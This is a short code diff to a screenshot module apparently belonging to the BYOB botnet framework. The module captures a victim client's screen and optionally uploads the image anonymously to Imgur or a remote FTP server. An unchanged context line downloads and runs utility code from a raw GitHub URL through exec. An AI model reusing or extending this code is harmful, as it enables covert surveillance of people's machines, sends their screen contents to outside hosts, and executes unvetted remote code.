@@ -6,6 +6,7 @@
 import os
 import sys
 import imp
+import Queue
 import urllib
 
 # utilities
@@ -14,12 +15,15 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-packages    = ['mss']
-platforms   = ['win32','linux2','darwin']
-
-# setup
-util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+command = True
+results = Queue.Queue()
+packages = ['mss']
+platforms = ['win32','linux2','darwin']
+usage = 'screenshot [imgur/ftp] [option=value, ...]'
+description = """
+Capture a screenshot on the client and optionally upload anonymously to 
+Imgur or to a remote FTP server (default: save image on local host machine)
+"""
 
 # main
 def run(upload_method=None):
@@ -28,6 +32,7 @@ def run(upload_method=None):
 
     `Optional`
     :param str upload_method:    ftp, imgur
+
     """
     if upload_method:
         try:
